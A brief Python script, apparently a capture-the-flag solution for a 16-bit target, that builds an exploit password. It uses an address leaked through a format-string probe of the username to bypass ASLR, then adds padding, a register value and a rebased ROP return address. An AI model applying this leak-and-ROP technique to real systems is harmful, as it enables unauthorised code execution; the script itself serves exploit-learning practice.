import struct
def hex_to_str(s):
	return " ".join("{:02x}".format(ord(c)) for c in s)
	
def endian(addr):
	return hex_to_str(struct.pack("H",addr))

#put this as the number from %x%x%x%x from the username
ASLR_ADDR = 0xabd4

address = 0x7546
rop = 0x7320

offset = address-rop
aslr_rop = ASLR_ADDR-offset

password = hex_to_str("A"*6) + " "#nops
password += endian(0x7F) + " "#r11
password += endian(aslr_rop) #location for int rop 

print("pass : " + password)
